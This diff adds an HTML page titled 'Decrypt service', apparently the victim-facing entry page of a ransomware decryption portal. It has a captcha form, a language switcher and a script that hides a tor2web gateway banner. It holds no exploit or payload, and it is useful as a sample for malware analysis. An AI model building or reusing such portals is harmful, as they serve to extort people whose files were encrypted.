@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+  <title>Decrypt service</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+  <link rel="stylesheet" href="img/style.css" type="text/css"/>
+  <script type="text/javascript">function dge(q){return document.getElementById(q);}(function h_hide(n){var hd=document.getElementById("tor2web-header");n++;if(hd)hd.style.display="none"; else if(n<15)setTimeout(function(){h_hide(n)},500);})(0)</script>
+  </head>
+  <body style="width:100%;" onload="document.getElementsByName('pic_code')[0].focus();">
+    <div id="maindiv" class="maindiv" style="width:100%" align=center valign=middle>
+      <table border=0 style="width:800px; margin-top:20px; margin-bottom:20px;" cellspacing=0 cellpadding=0>
+	<tr><td class="angle bltpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brtpng"></td>
+	</tr>
+	<tr><td class="bwhite"></td>
+	  <td class="bwhite" valign="top">
+	    <div id="decrypt" class="s13" style="text-align:center;">
+	      
+	          <center>
+		  <div style="border-style:solid; border-width:2px; border-color:#DEDEDE; padding:8px; width:330px;">
+		    <form method="POST" name="langs">
+		      <input type="hidden" id="scl" name="switchlang" value="">
+		&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='us'; langs.submit();"><img src="img/flags/us.png" style="border-width:0px;"> US</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='it'; langs.submit();"><img src="img/flags/it.png" style="border-width:0px;"> IT</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='fr'; langs.submit();"><img src="img/flags/fr.png" style="border-width:0px;"> FR</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='es'; langs.submit();"><img src="img/flags/es.png" style="border-width:0px;"> ES</a>&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" onclick="dge('scl').value='de'; langs.submit();"><img src="img/flags/de.png" style="border-width:0px;"> DE</a>&nbsp;&nbsp;
+		    </form>
+		  </div>
+	          </center>
+		
+	    <div class="welcome">
+	      Service to decrypt the files.<br>To continue please enter the code from the picture in the input field.
+	    </div>
+	    <form action="" method="POST" onsubmit="var pic_code = document.getElementsByName('pic_code')[0]; if (pic_code.value.length != 5) { alert('Error: code must be 5 characters'); pic_code.focus(); return false; }">
+	      <img src="picture.php?k=429j74&cb7ee43bba9d593197615da88966e614" style="border-style:solid; border-width:2px; border-color:#BBBBBB;"><br><br>
+	      
+	      <center>
+		<div style="border-style:solid; font-size:13px; border-width:2px; border-color:#DEDEDE; padding:8px; width:220px;">
+	        <b>Code of picture:</b> <input type="text" name="pic_code" class="welcome_code"  maxlength="5">
+	        </div>
+	      </center><br>
+	      <input type="submit" class="welcome_submit" value="Enter to decrypt service">
+	    </form>
+	    
+	    </div>
+	  </td>
+	  <td class="bwhite"></td>
+	</tr>
+	<tr><td class="angle blbpng"></td>
+	  <td class="bwhite"></td>
+	  <td class="angle brbpng"></td>
+	</tr>
+      </table>
+    </div>
+  </body>
+</html>
